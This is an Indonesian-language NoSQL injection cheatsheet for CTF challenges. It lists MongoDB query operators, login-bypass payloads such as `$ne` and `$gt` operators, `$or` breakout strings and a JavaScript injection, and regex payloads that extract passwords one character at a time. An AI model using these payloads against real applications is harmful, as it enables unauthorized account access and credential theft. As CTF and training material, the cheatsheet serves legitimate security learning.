# NoSQL Injection Cheatsheet (CTF)

## Penggunaan & Payload NoSQL Injection

### 1. Operator Penting MongoDB

| Operator | Fungsi                          | Contoh Penggunaan                                                                                          |
| -------- | ------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| `$ne`    | Not Equal (tidak sama dengan)   | `{ "username": { "$ne": "admin" } }`<br>Query user selain admin                                            |
| `$eq`    | Equal (sama dengan)             | `{ "age": { "$eq": 18 } }`<br>Query user dengan age=18                                                     |
| `$gt`    | Greater Than (lebih besar dari) | `{ "age": { "$gt": 18 } }`<br>Query user dengan age>18                                                     |
| `$lt`    | Less Than (lebih kecil dari)    | `{ "age": { "$lt": 18 } }`<br>Query user dengan age<18                                                     |
| `$in`    | Ada di dalam array              | `{ "role": { "$in": ["admin", "user"] } }`<br>Query user dengan role admin/user                            |
| `$nin`   | Tidak ada di dalam array        | `{ "status": { "$nin": ["inactive"] } }`<br>Query user dengan status selain inactive                       |
| `$regex` | Regular Expression (pola)       | `{ "username": { "$regex": ".*ad.*" } }`<br>Query username yang mengandung 'ad'                            |
| `$or`    | Salah satu kondisi benar        | `{ "$or": [ { "username": "admin" }, { "role": "admin" } ] }`<br>Query user username=admin atau role=admin |
| `$and`   | Semua kondisi benar             | `{ "$and": [ { "active": true }, { "age": { "$gt": 18 } } ] }`<br>Query user aktif dan age>18              |

---

### 2. Payload Bypass Login

- **Bypass login universal:**

  - username: `{ "$ne": null }`
  - password: `{ "$ne": null }`

- **Bypass login user tertentu:**

  - username: `admin`
  - password: `{ "$ne": "1" }`

- **Login tanpa password:**

  - username: `admin' || '1'=='1`
  - password: `apapun`

- **Menggunakan $or:**

  - username: `admin" }, "$or": [ {}, { "a":"a`
  - password: `" } ] //`

- **Regex Injection:**

  - username: `admin`
  - password: `{ "$regex": ".*" }`

- **Payload lain:**
  - username: `{ "$gt": "" }`
  - password: `{ "$ne": "" }`
  - username: `admin' && this.password.match(/.*/)//`

---

### 3. Ekstraksi & Brute Force Data

- **Mengetahui panjang password:**

  - username: `admin`
  - password: `{ "$regex": ".{8}" }`

- **Mengecek karakter pertama password:**

  - username: `admin`
  - password: `{ "$regex": "^a.*" }`

- **Mengecek karakter kedua password:**

  - username: `admin`
  - password: `{ "$regex": "^.b.*" }`

- **Brute force karakter per karakter:**

  - username: `admin`
  - password: `{ "$regex": "^.{3}c.*" }` (cek karakter ke-4 adalah 'c')

- **Cek password hanya huruf/angka:**

  - username: `admin`
  - password: `{ "$regex": "^[a-zA-Z0-9]+$" }`

- **Cek password mengandung string tertentu:**
  - username: `admin`
  - password: `{ "$regex": "flag" }`

---

### 4. Tips & Trik NoSQL Injection di CTF

- Coba input JSON, array, dan operator MongoDB.
- Perhatikan error message dan response time.
- Gunakan tools seperti Burp Suite, Postman, atau curl untuk testing.
- Cek apakah aplikasi melakukan sanitasi input.
- Coba kombinasi payload untuk bypass login, enum data, atau dump data.
- Lakukan brute force dengan script otomatis jika memungkinkan.
